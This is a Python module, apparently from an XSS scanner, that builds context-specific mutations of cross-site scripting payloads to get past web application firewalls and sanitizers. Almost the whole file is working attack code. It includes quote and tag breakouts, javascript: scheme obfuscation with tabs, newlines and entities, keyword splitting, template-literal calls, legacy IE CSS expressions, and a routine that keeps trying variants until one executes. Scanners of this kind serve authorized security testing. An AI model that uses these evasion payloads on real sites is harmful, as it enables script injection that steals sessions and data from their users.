"""Context-aware mutation engine (Phase 13b).

Traditional XSS scanners apply the SAME set of WAF-evasion transforms
regardless of where the payload is reflected.  This is wasteful and
often counter-productive:

  * A `comment_break` transform (inserting ``/**/``) does nothing useful
    in an HTML-element reflection context -- it's just noise.
  * A `js_unicode` transform (``\\uXXXX``) only helps when the payload
    lands inside a JavaScript string literal.
  * `html_entity_named` is great for HTML contexts but inert in script
    contexts (the JS engine doesn't decode HTML entities).

This module maps each reflection context (as classified by
``context._analyze_at``) to the SUBSET of transforms that actually help
in that context, plus a small set of context-specific MUTATIONS that
go beyond what ``transform.py`` provides:

  * **HTML element**      -> tag-name mutations, attribute splitter,
                             SVG foreign-content tricks.
  * **HTML attribute**    -> quote-context breakouts, attribute-boundary
                             confusion, duplicate-attribute divergence.
  * **Script string**     -> string-terminator mutations, template-literal
                             conversion, comment injection.
  * **Style block**       -> CSS-context breakouts, ``expression()`` for
                             legacy IE, ``@import`` chains.
  * **URL/href**          -> ``javascript:`` URI mutations, scheme
                             confusion (``java\tscript:``, ``jav&#x09;ascript:``).
  * **Comment**           -> comment-terminator mutations.
  * **CDATA**             -> CDATA-section terminator mutations.

The engine is consumed by the scanner in two ways:

  1. ``mutate_for_context(payload, context)`` returns a list of mutated
     variants for the scanner to try in place of the global
     ``_DEFAULT_TRANSFORMS`` list.
  2. ``best_mutation_for_context(context)`` returns the single best
     mutation strategy for a context, useful for the polyglot fallback.
"""
from __future__ import annotations
import re
from typing import Callable

# Import the existing transform registry so we can re-use its primitives
# rather than duplicating the encoding logic.
from . import transform as _t


# A mutation is a function (payload: str) -> str.  Each mutation lives in
# a context-specific bucket so the scanner only applies mutations that
# make sense for the detected reflection context.
Mutation = Callable[[str], str]


# ---------------------------------------------------------------------------
# Context-specific mutation primitives
# ---------------------------------------------------------------------------

# --- HTML element context mutations ----------------------------------------

def _m_html_tag_break(payload: str) -> str:
    """Insert a stray ``>`` before the payload to close any surrounding
    tag, then inject ours.  Useful when the server wraps reflection in
    an unexpected element."""
    if not payload.startswith("<"):
        return ">" + payload
    return payload


def _m_html_attr_split(payload: str) -> str:
    """Split a tag's attribute list by injecting a space + new attribute.
    E.g. ``<svg/onload=alert(1)>`` -> ``<svg onload=alert(1) x=>``.
    Defeats filters that key on ``/`` inside a tag."""
    return payload.replace("/onload", " onload")


def _m_html_svg_foreign(payload: str) -> str:
    """Wrap the payload in an SVG foreign-content trick that exploits
    HTML parser re-serialization quirks.  The payload executes only
    after the browser's parser round-trip, defeating naive sanitizers."""
    if "<svg" in payload.lower():
        return payload
    return "<svg><style>" + payload + "</style></svg>"


def _m_html_uppercase_tags(payload: str) -> str:
    """Uppercase tag names (case-insensitive in HTML).  Defeats
    case-sensitive filters that block ``<script`` but not ``<SCRIPT``."""
    return re.sub(r"<(/?)([a-zA-Z]+)", lambda m: "<" + m.group(1) + m.group(2).upper(), payload)


# --- HTML attribute context mutations --------------------------------------

def _m_attr_quote_break(payload: str) -> str:
    """Prepend both quote types so the payload breaks out of either
    single- or double-quoted attributes."""
    if payload.startswith('"') or payload.startswith("'"):
        return payload
    return '"\'>' + payload


def _m_attr_duplicate(payload: str) -> str:
    """Duplicate-attribute divergence: prepend a benign duplicate of the
    enclosing attribute so lenient parsers keep the last (ours) and
    strict parsers keep the first (also ours if we close it)."""
    return 'x="" ' + payload


def _m_attr_backtick(payload: str) -> str:
    """Use a backtick as an attribute-value delimiter (legacy IE/Edge).
    ``value=`x` onerror=alert(1)`` parses as two attributes in old parsers."""
    if "=" in payload:
        return payload.replace("=", "=`", 1).replace(">", "`>", 1)
    return payload


def _m_attr_no_quote(payload: str) -> str:
    """Strip quotes around the breakout so the attribute value runs into
    the next attribute.  ``">`` becomes ``>`` which works when the
    server's attribute is unquoted."""
    if payload.startswith('"') or payload.startswith("'"):
        return payload[1:]
    return payload


# --- Script string context mutations ---------------------------------------

def _m_script_close_tag(payload: str) -> str:
    """Close the <script> block entirely before injecting.  This is the
    most reliable script-string breakout: ``</script><svg onload=...>``."""
    if "</script>" in payload.lower():
        return payload
    return "</script>" + payload


def _m_script_string_terminator(payload: str) -> str:
    """Break out of a JS string literal with both quote types + a
    semicolon.  Works for '...'|\"...\"|`...` strings."""
    if payload.startswith(("'", '"', "`")):
        return payload
    return "'\"`;" + payload


def _m_script_template_literal(payload: str) -> str:
    """Convert ``alert(1)`` to ``alert`1``` (template-literal call).
    Bypasses filters that key on ``alert(`` but not ``alert``."""
    return re.sub(r"alert\(([^)]+)\)", r"alert`\1`", payload)


def _m_script_comment_chain(payload: str) -> str:
    """Inject a JS comment to neutralize the trailing string the server
    appends.  ``";alert(1);//`` already does this; ensure it's present."""
    if payload.endswith(";"):
        return payload + "//"
    if not payload.endswith("//"):
        return payload + "//"
    return payload


def _m_script_concat(payload: str) -> str:
    """Replace ``alert`` with ``'ale'+'rt'`` to dodge keyword filters."""
    return payload.replace("alert", "'ale'+'rt'")


# --- Style block / CSS context mutations -----------------------------------

def _m_style_close_tag(payload: str) -> str:
    """Close the <style> block before injecting HTML."""
    if "</style>" in payload.lower():
        return payload
    return "</style>" + payload


def _m_style_expression(payload: str) -> str:
    """Convert ``alert(1)`` to ``expression(alert(1))`` for legacy IE
    CSS-expression execution inside ``style="..."`` attributes."""
    if "expression(" in payload:
        return payload
    return re.sub(r"alert\(([^)]+)\)", r"expression(alert(\1))", payload)


def _m_style_import(payload: str) -> str:
    """Prepend a CSS ``@import`` of a javascript: URL (legacy IE)."""
    return "@import 'javascript:" + payload + "';"


def _m_style_string_terminator(payload: str) -> str:
    """Break out of a CSS string literal with both quote types."""
    if payload.startswith(('"', "'")):
        return payload
    return "\"';" + payload


# --- URL / href context mutations ------------------------------------------

def _m_url_javascript_scheme(payload: str) -> str:
    """Ensure the payload starts with ``javascript:`` so it executes as
    a URI in href/src contexts."""
    if payload.lower().startswith("javascript:"):
        return payload
    return "javascript:" + payload


def _m_url_scheme_tab(payload: str) -> str:
    """Insert a tab inside ``javascript:`` -- ``java\tscript:`` is
    normalized by browsers but not by most WAFs."""
    p = payload
    if p.lower().startswith("javascript:"):
        return "java\tscript:" + p[len("javascript:"):]
    return p


def _m_url_scheme_newline(payload: str) -> str:
    """Insert a newline inside ``javascript:`` -- ``java\nscript:``."""
    p = payload
    if p.lower().startswith("javascript:"):
        return "java\nscript:" + p[len("javascript:"):]
    return p


def _m_url_scheme_entity(payload: str) -> str:
    """HTML-entity-encode the ``j`` of ``javascript:`` -- ``&#106;avascript:``."""
    p = payload
    if p.lower().startswith("javascript:"):
        return "&#106;avascript:" + p[len("javascript:"):]
    return p


def _m_url_data_uri(payload: str) -> str:
    """Wrap the payload in a ``data:text/html,...`` URI (works in
    href/src on some browsers)."""
    return "data:text/html," + payload


# --- HTML comment context mutations ----------------------------------------

def _m_comment_close(payload: str) -> str:
    """Close the HTML comment before injecting."""
    if payload.startswith("-->"):
        return payload
    return "-->" + payload


def _m_comment_double_dash(payload: str) -> str:
    """Insert ``--!>`` (alternative comment terminator supported by
    HTML5 parsers but not by all filters)."""
    if payload.startswith("--!>"):
        return payload
    return "--!>" + payload


def _m_comment_nested(payload: str) -> str:
    """Nested-comment confusion: ``<!-- --> -->`` lets some parsers
    treat the second ``-->`` as inside the comment and others as outside."""
    return "<!-- " + payload + " -->"


# --- CDATA context mutations -----------------------------------------------

def _m_cdata_close(payload: str) -> str:
    """Close the CDATA section before injecting."""
    if payload.startswith("]]>"):
        return payload
    return "]]>" + payload


def _m_cdata_double_close(payload: str) -> str:
    """Insert a fake CDATA close that some parsers honour."""
    return "]]]]><![CDATA[>" + payload


# --- Template ({{ }}) context mutations ------------------------------------

def _m_template_close(payload: str) -> str:
    """Close the ``}}`` template expression before injecting."""
    if payload.startswith("}}"):
        return payload
    return "}}" + payload


def _m_template_string_out(payload: str) -> str:
    """Break out of a Vue/Angular string interpolation with a quote."""
    return "')" + payload


# ---------------------------------------------------------------------------
# Context -> mutation-list registry
# ---------------------------------------------------------------------------

# Each context maps to a list of (mutation_name, mutation_fn) pairs.
# The scanner picks the first N that apply.  We also include a few
# transform.py entries that are CONTEXT-APPROPRIATE (e.g. js_unicode
# only in script contexts, html_entity only in HTML contexts).
_CONTEXT_MUTATIONS: dict[str, list[tuple[str, Mutation]]] = {
    "html_element": [
        ("html_tag_break", _m_html_tag_break),
        ("html_attr_split", _m_html_attr_split),
        ("html_svg_foreign", _m_html_svg_foreign),
        ("html_uppercase_tags", _m_html_uppercase_tags),
        ("t_mixed_case", _t.t_mixed_case),
        ("t_html_entity_named", _t.t_html_entity_named),
        ("t_comment_break", _t.t_comment_break),
        ("t_fullwidth", _t.t_fullwidth),
    ],
    "html_attribute_dq": [
        ("attr_quote_break", _m_attr_quote_break),
        ("attr_duplicate", _m_attr_duplicate),
        ("attr_backtick", _m_attr_backtick),
        ("attr_no_quote", _m_attr_no_quote),
        ("t_mixed_case", _t.t_mixed_case),
        ("t_html_entity_named", _t.t_html_entity_named),
        ("t_duplicate_attribute", _t.t_duplicate_attribute),
    ],
    "html_attribute_sq": [
        ("attr_quote_break", _m_attr_quote_break),
        ("attr_duplicate", _m_attr_duplicate),
        ("attr_backtick", _m_attr_backtick),
        ("t_mixed_case", _t.t_mixed_case),
        ("t_html_entity_named", _t.t_html_entity_named),
    ],
    "html_comment": [
        ("comment_close", _m_comment_close),
        ("comment_double_dash", _m_comment_double_dash),
        ("comment_nested", _m_comment_nested),
        ("t_html_entity_named", _t.t_html_entity_named),
    ],
    "script_block": [
        ("script_close_tag", _m_script_close_tag),
        ("script_template_literal", _m_script_template_literal),
        ("script_concat", _m_script_concat),
        ("t_js_unicode", _t.t_js_unicode),
        ("t_comment_break", _t.t_comment_break),
        ("t_constructor_escape", _t.t_constructor_escape),
        ("t_fromcharcode", _t.t_fromcharcode),
    ],
    "script_string_dq": [
        ("script_close_tag", _m_script_close_tag),
        ("script_string_terminator", _m_script_string_terminator),
        ("script_template_literal", _m_script_template_literal),
        ("script_comment_chain", _m_script_comment_chain),
        ("script_concat", _m_script_concat),
        ("t_js_unicode", _t.t_js_unicode),
        ("t_constructor_escape", _t.t_constructor_escape),
    ],
    "script_string_sq": [
        ("script_close_tag", _m_script_close_tag),
        ("script_string_terminator", _m_script_string_terminator),
        ("script_template_literal", _m_script_template_literal),
        ("script_comment_chain", _m_script_comment_chain),
        ("script_concat", _m_script_concat),
        ("t_js_unicode", _t.t_js_unicode),
        ("t_constructor_escape", _t.t_constructor_escape),
    ],
    "script_string_bt": [
        ("script_close_tag", _m_script_close_tag),
        ("script_template_literal", _m_script_template_literal),
        ("script_concat", _m_script_concat),
        ("t_js_unicode", _t.t_js_unicode),
        ("t_constructor_escape", _t.t_constructor_escape),
    ],
    "style_block": [
        ("style_close_tag", _m_style_close_tag),
        ("style_expression", _m_style_expression),
        ("style_import", _m_style_import),
        ("t_css_unicode", _t.t_css_unicode),
    ],
    "style_string_dq": [
        ("style_close_tag", _m_style_close_tag),
        ("style_string_terminator", _m_style_string_terminator),
        ("style_expression", _m_style_expression),
        ("t_css_unicode", _t.t_css_unicode),
    ],
    "style_string_sq": [
        ("style_close_tag", _m_style_close_tag),
        ("style_string_terminator", _m_style_string_terminator),
        ("style_expression", _m_style_expression),
        ("t_css_unicode", _t.t_css_unicode),
    ],
    "css": [
        ("style_close_tag", _m_style_close_tag),
        ("style_expression", _m_style_expression),
        ("t_css_unicode", _t.t_css_unicode),
    ],
    "url_href": [
        ("url_javascript_scheme", _m_url_javascript_scheme),
        ("url_scheme_tab", _m_url_scheme_tab),
        ("url_scheme_newline", _m_url_scheme_newline),
        ("url_scheme_entity", _m_url_scheme_entity),
        ("url_data_uri", _m_url_data_uri),
        ("t_html_entity_named", _t.t_html_entity_named),
    ],
    "url_javascript": [
        ("url_javascript_scheme", _m_url_javascript_scheme),
        ("url_scheme_tab", _m_url_scheme_tab),
        ("url_scheme_entity", _m_url_scheme_entity),
        ("t_mixed_case", _t.t_mixed_case),
    ],
    "meta_refresh": [
        ("url_javascript_scheme", _m_url_javascript_scheme),
        ("url_scheme_tab", _m_url_scheme_tab),
        ("url_scheme_entity", _m_url_scheme_entity),
        ("t_html_entity_named", _t.t_html_entity_named),
    ],
    "cdata": [
        ("cdata_close", _m_cdata_close),
        ("cdata_double_close", _m_cdata_double_close),
        ("t_html_entity_named", _t.t_html_entity_named),
    ],
    "svg_context": [
        ("html_tag_break", _m_html_tag_break),
        ("html_uppercase_tags", _m_html_uppercase_tags),
        ("t_mixed_case", _t.t_mixed_case),
        ("t_html_entity_named", _t.t_html_entity_named),
    ],
    "math_context": [
        ("html_tag_break", _m_html_tag_break),
        ("html_uppercase_tags", _m_html_uppercase_tags),
        ("t_mixed_case", _t.t_mixed_case),
    ],
    "template_angular": [
        ("template_close", _m_template_close),
        ("template_string_out", _m_template_string_out),
        ("t_mixed_case", _t.t_mixed_case),
    ],
    "template_vue": [
        ("template_close", _m_template_close),
        ("template_string_out", _m_template_string_out),
        ("t_mixed_case", _t.t_mixed_case),
    ],
    "event_handler": [
        ("t_mixed_case", _t.t_mixed_case),
        ("t_constructor_escape", _t.t_constructor_escape),
        ("t_fromcharcode", _t.t_fromcharcode),
        ("script_concat", _m_script_concat),
    ],
}


# Fallback mutation list for unknown contexts (used when context
# classification fails or returns something unexpected).  This is a
# conservative spread that covers the most common reflection points.
_FALLBACK_MUTATIONS: list[tuple[str, Mutation]] = [
    ("t_mixed_case", _t.t_mixed_case),
    ("t_html_entity_named", _t.t_html_entity_named),
    ("t_comment_break", _t.t_comment_break),
    ("t_constructor_escape", _t.t_constructor_escape),
    ("t_fullwidth", _t.t_fullwidth),
    ("t_null_byte", _t.t_null_byte),
    ("t_html5_entities", _t.t_html5_entities),
]


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

def mutations_for_context(context: str) -> list[tuple[str, Mutation]]:
    """Return the list of (name, mutation_fn) pairs appropriate for the
    given reflection context.  Falls back to a conservative spread if
    the context is unknown.
    """
    return list(_CONTEXT_MUTATIONS.get(context, _FALLBACK_MUTATIONS))


def mutate_for_context(payload: str,
                       context: str,
                       max_variants: int = 12) -> list[tuple[list[str], str]]:
    """Generate mutated variants of ``payload`` for the given context.

    Returns a list of ``(transform_chain, variant_payload)`` pairs.
    Each pair represents one mutated variant: ``transform_chain`` is the
    list of mutation names applied (for reporting), and ``variant_payload``
    is the resulting payload string.

    The scanner iterates this list and tries each variant until one
    bypasses the filter and confirms execution.

    Args:
        payload: the base payload to mutate.
        context: the reflection context (from ``context._analyze_at``).
        max_variants: cap on the number of variants to return.
    """
    muts = mutations_for_context(context)
    out: list[tuple[list[str], str]] = []
    # Stage 1: each mutation in isolation.
    for name, fn in muts[:max_variants]:
        try:
            variant = fn(payload)
            if variant and variant != payload:
                out.append(([name], variant))
        except Exception:
            continue
        if len(out) >= max_variants:
            break
    # Stage 2: a few high-yield 2-combos.
    if len(out) < max_variants and len(muts) >= 2:
        # Pick the top 2 mutations and combine them.
        for i in range(min(3, len(muts) - 1)):
            n1, f1 = muts[i]
            n2, f2 = muts[i + 1]
            try:
                v = f2(f1(payload))
                if v and v != payload:
                    out.append(([n1, n2], v))
            except Exception:
                continue
            if len(out) >= max_variants:
                break
    # Always include the unmutated base as the last resort.
    if not any(v == payload for _, v in out):
        out.append(([], payload))
    return out[:max_variants]


def best_mutation_for_context(context: str) -> tuple[str, Mutation] | None:
    """Return the single best (name, fn) mutation for the context, or None."""
    muts = mutations_for_context(context)
    return muts[0] if muts else None


def supported_contexts() -> list[str]:
    """Return the list of reflection contexts this engine understands."""
    return list(_CONTEXT_MUTATIONS.keys())


def apply_mutation(payload: str, name: str) -> str:
    """Apply a single named mutation to a payload.  Looks up the mutation
    in any context's list (so callers don't need to know the context)."""
    for muts in _CONTEXT_MUTATIONS.values():
        for n, fn in muts:
            if n == name:
                try:
                    return fn(payload)
                except Exception:
                    return payload
    # Also check the transform registry (mutations can reference transforms).
    return _t.apply(name, payload)
